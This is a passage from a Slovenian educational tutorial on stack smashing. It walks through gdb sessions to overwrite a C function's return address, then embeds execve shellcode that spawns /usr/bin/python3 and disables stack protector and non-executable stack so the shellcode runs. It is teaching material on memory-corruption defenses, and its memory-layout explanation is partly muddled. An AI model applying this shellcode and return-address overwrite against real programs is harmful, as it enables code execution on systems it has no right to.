Naslov ukaza, ki kaže na začetek klica funkcije `printf` lahko ugotovimo tudi tako, da spremenljivko `Y` nastavimo na 0 in z `gdb` izvajamo naš program z ukazom `s` in se ustavimo, ko pridemo do vrstice printf("c: %d\n", c); in nato izpišemo programsko kodo funkcije `main` z ukazom `disassemble` in pogledam na kateri naslov kaže puščica trenutnega ukaza.

    gdb stacky

    Reading symbols from stacky...
    (gdb) break main
    Breakpoint 1 at 0x1176: file stacky.c, line 16.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, main () at stacky.c:16
    16	        c = 5;
    (gdb) s
    17	        d = 3;
    (gdb) s
    18	        e = c + d;              // e == 8
    (gdb) s
    19	        e = callme(d, &e);		// e == 11
    (gdb) s
    callme (a=3, b=0x7fffffffe050) at stacky.c:8
    8	        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
    (gdb) s
    9	        *f = *f + Y;
    (gdb) s
    10	        return a + *b;
    (gdb) s
    11	    }
    (gdb) s
    main () at stacky.c:20
    20	        c = c + e; 				// c == 16
    (gdb) s
    21	        printf("c: %d\n", c);	
    (gdb) dis
    disable      disassemble  disconnect   display      
    (gdb) disassemble main
    Dump of assembler code for function main:
        0x0000555555555172 <+0>:	push   %rbp
        0x0000555555555173 <+1>:	mov    %rsp,%rbp
        0x0000555555555176 <+4>:	sub    $0x10,%rsp
        0x000055555555517a <+8>:	movl   $0x5,-0x4(%rbp)
        0x0000555555555181 <+15>:	movl   $0x3,-0x8(%rbp)
        0x0000555555555188 <+22>:	mov    -0x4(%rbp),%edx
        0x000055555555518b <+25>:	mov    -0x8(%rbp),%eax
        0x000055555555518e <+28>:	add    %edx,%eax
        0x0000555555555190 <+30>:	cltq
        0x0000555555555192 <+32>:	mov    %rax,-0x10(%rbp)
        0x0000555555555196 <+36>:	lea    -0x10(%rbp),%rdx
        0x000055555555519a <+40>:	mov    -0x8(%rbp),%eax
        0x000055555555519d <+43>:	mov    %rdx,%rsi
        0x00005555555551a0 <+46>:	mov    %eax,%edi
        0x00005555555551a2 <+48>:	call   0x555555555139 <callme>
        0x00005555555551a7 <+53>:	cltq
        0x00005555555551a9 <+55>:	mov    %rax,-0x10(%rbp)
        0x00005555555551ad <+59>:	mov    -0x10(%rbp),%rax
        0x00005555555551b1 <+63>:	mov    %eax,%edx
        0x00005555555551b3 <+65>:	mov    -0x4(%rbp),%eax
        0x00005555555551b6 <+68>:	add    %edx,%eax
        0x00005555555551b8 <+70>:	mov    %eax,-0x4(%rbp)
    =>  0x00005555555551bb <+73>:	mov    -0x4(%rbp),%eax
        0x00005555555551be <+76>:	mov    %eax,%esi
        0x00005555555551c0 <+78>:	lea    0xe3d(%rip),%rax        # 0x555555556004
        0x00005555555551c7 <+85>:	mov    %rax,%rdi
        0x00005555555551ca <+88>:	mov    $0x0,%eax
        0x00005555555551cf <+93>:	call   0x555555555030 <printf@plt>
        0x00005555555551d4 <+98>:	mov    $0x0,%eax
        0x00005555555551d9 <+103>:	leave
        0x00005555555551da <+104>:	ret
    End of assembler dump.

V naši kodi torej spremenljivka `f` sedaj hrani naslov v pomnilniku kjer se nahaja vrnitveni naslov. Sedaj pa bomo popravili še vrstico `*f = *f + Y;`, tako da bo vrnitveni naslov kazal na ukaz `printf("c: %d\n", c);` namesto na `c = c + e;`. Ugotoviti moramo s katerim ukazom se začne izvajati klic funkcije `printf`, saj moramo pred klicem naložiti pravilne vrednosti v pravilne registre. Ob pregledu kode v zbirniku ugotovimo, da se registri za klic funkcije `printf`, začnejo pri ukazu `mov    -0x4(%rbp),%eax` na naslovu `0x5555555551b7b`. Torej `Y` predstavlja razliko med naslovom ukaza `cltq`, ki je `0x5555555551a7` in naslovom ukaza `mov    -0x4(%rbp),%eax `, ki je `0x5555555551bb`.

    gdb stacky

    Reading symbols from stacky...
    (gdb) p 0x00005555555551bb - 0x00005555555551a7 
    $2 = 20

Sedaj popravimo vrstico `#define Y 20` in prevedemo kodo ter preverimo ali program sedaj preskoči vrstico `c = c + e;` ter nam vrne rezultat `c = 5`.

    nano stacky.c

    #include <stdio.h>

    #define X 28
    #define Y 20

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(((char*)&a) + X);  // Override return address.
        *f = *f + Y;
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);              // e == 11
        c = c + e;                              // c == 16
        printf("c: %d\n", c);   
        return 0;
    }

    gcc stacky.c -g -o stacky
    ./stacky

    c: 5

Vrstico `f = (unsigned long*)(((char*)&a) + X);` lahko poenostavimo tako, da namesto z bajti delamo z 32-bitnimi celimi števili in posledično delimo vrednost konstante `X` s 4, da dobimo vrednost 7.

    nano stacky.c

    #include <stdio.h>

    #define X 7
    #define Y 20

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(&a + X);	// Override return address.
        *f = *f + Y;				    // Jump over the line c = c + e.
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -g -o stacky

    ./stacky

    c: 5

Sedaj pa bomo podali še naš začetni program kot niz program `stacky.c`. Niz pridobimo tako, da program izpišemo v zbirniku z orodjem `gdb` in ga izpišemo kot niz od vključno ukaza `jmp    0x114e <main+41>` do vključno z vrstico za ukazom `call`.

    gcc program.S -g -o program

    gdb program

    Reading symbols from program...
    (gdb) disassemble main
    Dump of assembler code for function main:
        0x0000000000001129 <+0>:	push   %rbp
        0x000000000000112a <+1>:	mov    %rsp,%rbp
        0x000000000000112d <+4>:	sub    $0x10,%rsp
        0x0000000000001131 <+8>:	mov    %edi,-0x4(%rbp)
        0x0000000000001134 <+11>:	mov    %rsi,-0x10(%rbp)
        0x0000000000001138 <+15>:	jmp    0x1148 <main+31>
        0x000000000000113a <+17>:	pop    %rdi
        0x000000000000113b <+18>:	xor    %rsi,%rsi
        0x000000000000113e <+21>:	xor    %rdx,%rdx
        0x0000000000001141 <+24>:	xor    %rax,%rax
        0x0000000000001144 <+27>:	mov    $0x3b,%al
        0x0000000000001146 <+29>:	syscall
        0x0000000000001148 <+31>:	call   0x113a <main+17>
        0x000000000000114d <+36>:	(bad)
        0x000000000000114e <+37>:	jne    0x11c3
        0x0000000000001150 <+39>:	jb     0x1181
        0x0000000000001152 <+41>:	(bad)
        0x0000000000001153 <+42>:	imul   $0x68747970,0x2f(%rsi),%ebp
        0x000000000000115a <+49>:	outsl  %ds:(%rsi),(%dx)
        0x000000000000115b <+50>:	outsb  %ds:(%rsi),(%dx)
        0x000000000000115c <+51>:	xor    (%rax),%eax
        0x000000000000115e <+53>:	mov    $0x0,%eax
        0x0000000000001163 <+58>:	leave
        0x0000000000001164 <+59>:	ret
    End of assembler dump.
    (gdb) p (char*)0x0000000000001138
    $1 = 0x1138 <main+15> "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3"

Niz našega programa `\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3` dodamo v `stacky.c` in za vrnitveni naslov nastavimo začetek našega niza v programu.

    nano stacky.c

    #include <stdio.h>

    #define X 7

    int callme(int a, unsigned long *b){
        unsigned long *f;
        char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3";
        f = (unsigned long*)(&a + X);	// Override return address.
        *f = (unsigned long)&(program[0]);
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -g -o stacky
    ./stacky

    c: 16

Zadeva ne deluje, saj smo dodali novo spremenljivko `program` za spremenljivko `a` na našo kopico, zato razlika med naslovom spremenljivke `a` in 8 bajtov za naslovom kamor kaže register `$rsp` ni več 7 32-bitnih celih števil. Ponovno odpremo program z orodjem `gdb` in ponovno izračunamo razliko med naslovom spremenljivke `a` in vrnitvenim naslovom.

    gdb stacky

    Reading symbols from stacky...
    (gdb) break callme
    Breakpoint 1 at 0x1144: file stacky.c, line 8.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, callme (a=3, b=0x7fffffffe050) at stacky.c:8
    7		char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3";
    (gdb) s
    8	        f = (unsigned long*)(&a + X);	// Override return address.
    (gdb) s
    9	        *f = (unsigned long)&(program[0]);
    (gdb) s
    10	        return a + *b;
    (gdb) p &a
    $1 = (int *) 0x7fffffffdfec
    (gdb) p $rsp+8
    $2 = (void *) 0x7fffffffe048
    (gdb) p/x *((unsigned long*)($rsp+8)) 
    $3 = 0x555555555206
    (gdb) disassemble main
    Dump of assembler code for function main:
        0x00005555555551d1 <+0>:	push   %rbp
        0x00005555555551d2 <+1>:	mov    %rsp,%rbp
        0x00005555555551d5 <+4>:	sub    $0x10,%rsp
        0x00005555555551d9 <+8>:	movl   $0x5,-0x4(%rbp)
        0x00005555555551e0 <+15>:	movl   $0x3,-0x8(%rbp)
        0x00005555555551e7 <+22>:	mov    -0x4(%rbp),%edx
        0x00005555555551ea <+25>:	mov    -0x8(%rbp),%eax
        0x00005555555551ed <+28>:	add    %edx,%eax
        0x00005555555551ef <+30>:	cltq
        0x00005555555551f1 <+32>:	mov    %rax,-0x10(%rbp)
        0x00005555555551f5 <+36>:	lea    -0x10(%rbp),%rdx
        0x00005555555551f9 <+40>:	mov    -0x8(%rbp),%eax
        0x00005555555551fc <+43>:	mov    %rdx,%rsi
        0x00005555555551ff <+46>:	mov    %eax,%edi
        0x0000555555555201 <+48>:	call   0x555555555139 <callme>
        0x0000555555555206 <+53>:	cltq
        0x0000555555555208 <+55>:	mov    %rax,-0x10(%rbp)
        0x000055555555520c <+59>:	mov    -0x10(%rbp),%rax
        0x0000555555555210 <+63>:	mov    %eax,%edx
        0x0000555555555212 <+65>:	mov    -0x4(%rbp),%eax
        0x0000555555555215 <+68>:	add    %edx,%eax
        0x0000555555555217 <+70>:	mov    %eax,-0x4(%rbp)
        0x000055555555521a <+73>:	mov    -0x4(%rbp),%eax
        0x000055555555521d <+76>:	mov    %eax,%esi
        0x000055555555521f <+78>:	lea    0xdde(%rip),%rax        # 0x555555556004
        0x0000555555555226 <+85>:	mov    %rax,%rdi
        0x0000555555555229 <+88>:	mov    $0x0,%eax
        0x000055555555522e <+93>:	call   0x555555555030 <printf@plt>
        0x0000555555555233 <+98>:	mov    $0x0,%eax
        0x0000555555555238 <+103>:	leave
        0x0000555555555239 <+104>:	ret
    End of assembler dump.
    (gdb) p 0x7fffffffe048 - 0x7fffffffdfec
    $4 = 92
    (gdb) p 92 / 4
    $5 = 23

Popravimo konstanto `X` v programu na vrednost 23, program prevedemo in ponovno poženemo.

    nano stacky.c

    #include <stdio.h>

    #define X 23

    int callme(int a, unsigned long *b){
        unsigned long *f;
        char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3";
        f = (unsigned long*)(&a + X);   // Override return address.
        *f = (unsigned long)&(program[0]);
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);              // e == 11
        c = c + e;                              // c == 16
        printf("c: %d\n", c);   
        return 0;
    }

    gcc stacky.c -g -o stacky
    ./stacky

    Segmentation fault

Program na vrne `Segmentation fault`, ki je posledica zaščite proti prepisovanju vrnitvenih naslovov. Če ponovimo, ima vsak program svoj del pomnilnika, kjer se programska koda nahaja na vrhu, zatem sledijo konstante ter kopica za dinamično hranjenje lokalni spremenljivk, ki se povečuje navzdol, potem imamo nekaj prostega pomnilnika in na koncu spodaj imamo sklad, ki se povečuje navzgor in na njegov vrh kaže register `rsp`. Operacijski sistemi vsebujejo [ukrepe za preprečevanje napadov s prepisovanjem vrnitvenih naslovov (Stack-smashing protection)](https://en.wikipedia.org/wiki/Buffer_overflow_protection):

1. [Naključno dodeljevanje prostora v pomnilniku posameznim delom programa (Address Space Layout Randomization - ASR)](https://en.wikipedia.org/wiki/Address_space_layout_randomization), ki preprečuje možnost ugotovitve, kje v spominu se nahaja del pomnilnika programa. Napadalec torej ne more uporabljati skokov na absolutne naslove v pomnilniku.
2. [Izvršilni sklad - (execstack)](https://linux.die.net/man/8/execstack) Del program, ki vsebuje programsko kodo ter kopico se označi kot del, ki se lahko izvede (execute), medtem, ko je sklad označen, kot del, ki se ne more izvajati (no execute). To informacijo poda program sam oz. njegov prevajalnik. Moderni prevajalniki privzeto dovolijo izvajanje le kodi sami (execute), ves preostali pomnilnik programa pa se ne sme izvajati (no execute).
3. [Zaščita sklada - (Stack protector)](https://developers.redhat.com/articles/2022/06/02/use-compiler-flags-stack-protection-gcc-and-clang#) med izvajanjem doda besedo na vrh sklada v pomnilniku programa, ki se preverja pred vsakim skokom v programu ali je bila spremenjena in preprečuje skoke v primeru, ko je bila le ta spremenjena.

Če bomo želeli izvesti naš napada, bomo morali omenjen ukrepe izklopiti.

    gcc stacky.c -fno-stack-protector -z execstack -g -o stacky

    ./stacky

    Python 3.9.2 (default, Feb 28 2021, 17:03:44)  

    [GCC 10.2.1 20210110] on linux 

    Type "help", "copyright", "credits" or "license" for more information. 

    >>> 

Od tukaj naprej pa lahko sledite članku [Smashing the stack for fun and profit](https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf) in uspešno zaključite vaš napad.
